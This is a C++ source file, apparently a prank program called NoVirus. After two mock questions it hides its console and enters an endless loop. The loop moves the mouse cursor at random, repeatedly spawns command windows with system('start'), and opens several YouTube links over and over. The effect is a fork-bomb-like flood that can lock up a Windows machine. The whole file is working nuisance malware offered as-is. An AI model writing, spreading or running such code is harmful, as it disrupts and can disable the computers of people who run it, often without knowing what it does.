// NoVirus.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <windows.h>
#include <shellapi.h>
#include <iostream>
#include <mmsystem.h>
#pragma comment(lib, "winmm")
#pragma comment(lib, "winmm.lib")


using namespace std;
void changeVolume() {
    INPUT ip = { 0 };
    ip.type = INPUT_KEYBOARD;
    ip.ki.wVk = VK_VOLUME_UP;   //or VOLUME_DOWN or MUTE
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
}

int main()
{

    int input;

    std::cout << "\033[1;37mIs this a virus?\033[0m\n";

    std::cout << "1) No\n2) Yes\n";

    std::cout << "Type your answer: ";
    //PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
    //PlaySound(TEXT("hello.wav"), NULL, SND_FILENAME || SND_ASYNC);
    std::cin >> input; // Get user input from the keyboard
    std::cout << "\033[1;37mdo you know where you contract this virus?\033[0m\n";

    std::cout << "1) i dont know\n2) i know\n";

    std::cout << "Type your answer: ";
    //PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
    //PlaySound(TEXT("hello.wav"), NULL, SND_FILENAME || SND_ASYNC);
    std::cin >> input; // Get user input from the keyboard
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    for (int i = 0; i < 3; i++) {
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=KE1ynBZ-9Bw", 0, 0, SW_SHOWNORMAL);
    }
    ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZHmROm_CRH4", 0, 0, SW_SHOWNORMAL);
    int x, y;
    PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
    while (true) {
        SetCursorPos(rand() % 1000, rand() % 800);
        system("start");
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=1d-n0Qi1ZvQ", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=VAnaq97yoM4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZKWwiMaSoyE", 0, 0, SW_SHOWNORMAL);
        //PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
        
        //Beep(1000, 100);
    }
}